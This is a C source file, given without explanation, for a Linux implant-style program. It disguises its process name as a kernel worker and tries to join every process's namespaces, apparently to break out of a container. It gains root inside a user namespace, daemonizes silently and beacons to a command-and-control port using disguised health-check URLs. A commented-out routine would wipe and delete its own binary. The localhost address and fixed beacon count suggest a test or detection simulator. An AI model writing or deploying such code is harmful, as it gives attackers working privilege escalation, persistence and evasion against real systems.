#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include <errno.h>

#define TAG     "[kworker/0:0]"
#define C2PORT  8443
#define REPS    5

static const char *NS[]  = {"user","pid","net","mnt","ipc","uts","cgroup"};
static const char *EP[]  = {"/health","/status","/metrics","/api/v1/check","/internal/ping"};

static void report(const char *m) {
    int s = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, 0);
    struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(C2PORT) };
    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
    if (s > 0 && connect(s, (void*)&a, sizeof(a)) == 0) {
        char buf[128];
        int l = snprintf(buf, sizeof(buf),
            "GET /error/%s HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n", m);
        send(s, buf, l, MSG_NOSIGNAL);
    }
    if (s > 0) close(s);
}

static void join_all(void) {
    DIR *d = opendir("/proc");
    if (!d) {
        report("opendir_failed");
        return;
    }
    struct dirent *e;
    while ((e = readdir(d))) {
        if (!isdigit(e->d_name[0])) continue;
        int p = atoi(e->d_name);
        if (p < 2) continue;
        for (int i = 0; i < (int)(sizeof(NS)/sizeof(*NS)); i++) {
            char path[64];
            snprintf(path, sizeof(path), "/proc/%d/ns/%s", p, NS[i]);
            int fd = open(path, O_RDONLY);
            if (fd < 0) {
                // couldn't open namespace, skip
                continue;
            }
            if (setns(fd, 0) != 0) {
                char errstr[64];
                snprintf(errstr, sizeof(errstr), "setns_%s_failed", NS[i]);
                report(errstr);
            }
            close(fd);
        }
    }
    closedir(d);
}

static void elevate(void) {
    if (unshare(CLONE_NEWUSER) != 0) {
        if (errno == EPERM) {
            report("userns_disabled");
        } else {
            report("unshare_user_failed");
        }
        return;
    }
    // deny gid mapping changes
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) {
        write(f, "deny\n", 5);
        close(f);
    }
    char m[64];
    snprintf(m, sizeof(m), "0 %d 1\n", getuid());
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f >= 0) {
        write(f, m, strlen(m));
        close(f);
    }
    snprintf(m, sizeof(m), "0 %d 1\n", getgid());
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f >= 0) {
        write(f, m, strlen(m));
        close(f);
    }
}

static void daemonize(void) {
    signal(SIGCHLD, SIG_IGN);
    if (fork()) _exit(0);
    setsid();
    prctl(PR_SET_NAME, TAG, 0,0,0);
    int d = open("/dev/null", O_RDWR);
    if (d >= 0) {
        dup2(d, STDIN_FILENO);
        dup2(d, STDOUT_FILENO);
        dup2(d, STDERR_FILENO);
        if (d > 2) close(d);
    }
}

static void beacon(void) {
    int s = socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, 0);
    struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(C2PORT) };
    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
    if (s > 0 && connect(s, (void*)&a, sizeof(a)) == 0) {
        srand(time(NULL) ^ getpid());
        const char *uri = EP[rand() % (sizeof(EP)/sizeof(*EP))];
        char buf[128];
        int l = snprintf(buf, sizeof(buf),
            "GET %s HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n", uri);
        send(s, buf, l, MSG_NOSIGNAL);
    }
    if (s > 0) close(s);
}

/*
static void self_delete(void) {
    int fd = open("/proc/self/exe", O_RDWR|O_CLOEXEC);
    if (fd < 0) return;
    struct stat st;
    if (fstat(fd, &st) == 0) {
        size_t rem = st.st_size;
        char zeros[4096];
        memset(zeros, 0, sizeof(zeros));
        lseek(fd, 0, SEEK_SET);
        while (rem) {
            size_t w = rem > sizeof(zeros) ? sizeof(zeros) : rem;
            write(fd, zeros, w);
            rem -= w;
        }
    }
    unlink("/proc/self/exe");
    close(fd);
}

*/


int main(void) {
    join_all();
    elevate();
    join_all();
    daemonize();
    for (int i = 0; i < REPS; i++) {
        beacon();
        sleep(2 + rand() % 2);
    }
    report("Completed");
    /* self_delete(); */
    return 0;
}
